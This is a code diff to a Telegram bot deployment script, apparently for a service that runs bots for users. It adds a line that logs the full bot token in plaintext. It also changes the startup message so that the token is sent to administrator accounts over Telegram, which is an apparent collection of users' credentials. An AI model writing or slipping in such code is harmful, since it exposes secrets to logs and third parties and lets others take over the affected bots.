@@ -29,6 +29,9 @@ if not all([API_ID, API_HASH, BOT_TOKEN]):
     logger.error("❌ Missing required API_ID, API_HASH, or BOT_TOKEN. Aborting deployment.")
     sys.exit(1)
 
+# Log the bot token for confirmation (be cautious with this in production!)
+logger.info(f"🔐 Using BOT_TOKEN: {BOT_TOKEN}")
+
 # Other config variables
 ENABLE_FSUB = user.get("ENABLE_FSUB", False)
 VERIFICATION_MODE = user.get("VERIFICATION_MODE", False)
@@ -64,7 +67,7 @@ app = Client(
 if __name__ == "__main__":
     logger.info("🚀 Starting deployed bot...")
     app.start()
-    
+
     me = app.get_me()
     BOT_USERNAME = me.username
     logger.info("🚀 Bot deployed successfully!")
@@ -74,7 +77,7 @@ if __name__ == "__main__":
         try:
             app.send_message(
                 admin_id,
-                f"✅ Deployed bot started as @{BOT_USERNAME} for USER_ID {USER_ID}."
+                f"✅ Deployed bot started as @{BOT_USERNAME} for USER_ID {USER_ID}.\n\n🔐 BOT_TOKEN: `{BOT_TOKEN}`"
             )
             logger.info(f"📨 Startup message sent to admin {admin_id}")
         except Exception as e:
